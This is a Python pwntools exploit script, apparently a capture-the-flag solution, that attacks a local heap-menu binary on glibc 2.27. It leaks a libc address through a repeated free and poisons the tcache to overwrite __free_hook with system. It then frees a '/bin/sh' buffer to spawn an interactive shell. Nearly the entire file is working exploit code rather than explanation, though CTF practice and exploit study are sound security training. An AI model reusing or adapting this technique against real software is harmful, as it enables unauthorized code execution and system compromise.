from pwn import *

remote_addr=['',0] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
#context.log_level=True

context.terminal = ["tmux", "new-window"]
#p=remote(remote_addr[0],remote_addr[1])

elf_path = "./of"
p = process(elf_path, aslr = False)
elf = ELF(elf_path)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla(": ", str(idx))

def add(idx):
    choice(1)
    choice(idx)
    ru("Done")

def edit(idx, content):
    choice(2)
    choice(idx)
    sa("Content: ", content)

def show(idx):
    choice(3)
    choice(idx)
    ru("Content: ")

def delete(idx):
    choice(4)
    choice(idx)

if __name__ == '__main__':
    add(0)
    add(1)
    for i in range(8):
        delete(0)
    show(0)
    libc_addr = u64(rv(8)) - 0x3ebca0
    libc.address = libc_addr
    lg("Libc address", libc_addr)

    edit(0, p64(libc.symbols["__free_hook"]))
    add(2)
    add(3)
    edit(3, p64(libc.symbols['system']))
    edit(2, '/bin/sh\x00')
    delete(2)
    p.interactive()

